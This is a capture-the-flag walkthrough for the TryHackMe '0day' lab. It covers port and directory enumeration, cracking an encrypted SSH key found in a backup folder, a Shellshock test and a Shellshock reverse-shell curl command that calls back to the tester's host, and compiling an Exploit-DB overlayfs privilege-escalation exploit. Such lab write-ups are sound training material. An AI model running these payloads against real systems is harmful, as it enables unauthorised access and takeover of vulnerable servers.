# 37 - 0day (overlayfs exploit)

Room Link --> [https://tryhackme.com/room/0day](https://tryhackme.com/room/0day)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.58.180 -T5 -sV -p-

# outputs
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```
{% endcode %}

#### ffuf enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.58.180/FUZZ -c -w /usr/share/dirb/wordlists/common.txt -fc 403,400 -t 500

admin                   
backup                  
cgi-bin                 
css                     
img                     
index.html              
js                      
robots.txt              
secret                  
uploads
```
{% endcode %}

Navigating to /backup, found an ssh private key.

<figure><img src=".gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

We see it's encrypted, so we use `ssh2john` to convert it to john format then crack it with john.

```
nano id_rsa
chmod 400 id_rsa
ssh2john id_rsa > id_hash.john
john id_hash.john --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src=".gitbook/assets/image (269).png" alt=""><figcaption><p>cracked.</p></figcaption></figure>

But no username yet :(

Back to enumeration:

#### Nikto enum

{% code overflow="wrap" %}
```
Nikto output the /cgi-bin/test.cgi hidden directory which is vulnerable to the shellshock exploitation.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

#### CHecking if the site is vulnerable

We can set the user agent to a function definition to exploit Shellshock:

{% code overflow="wrap" lineNumbers="true" %}
```bash
# using curl
curl http://0day.thm/cgi-bin/test.cgi -H "User-agent: () { :;}; echo; echo vulnerable"
```
{% endcode %}

<figure><img src=".gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

We see the page is vulnerable.

### Initial Access

{% code overflow="wrap" lineNumbers="true" %}
```bash
# setup a nc listener.
curl http://0day.thm/cgi-bin/test.cgi -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.18.88.214/4444 0>&1"
```
{% endcode %}

<figure><img src=".gitbook/assets/image (272).png" alt=""><figcaption><p>We got a shell.</p></figcaption></figure>

### Priv Esc

Following the hine, we check the dist version : `uname -a` .

when we google "ubuntu 3.13 exploit" we came accross the Overlayfs ' Local Privilege Escalation.

{% embed url="https://www.exploit-db.com/exploits/37292" %}

Download and send to victim.

{% hint style="info" %}
We have to add the standard Ubuntu env path variable or this compilation to work.
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
# standard Ubuntu path, we do this vbecause the machine version is very old.
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin


# then compile
gcc ofs.c -o ofs
chmod +x ofs
./ofs
id
```
{% endcode %}

<figure><img src=".gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>



Done!

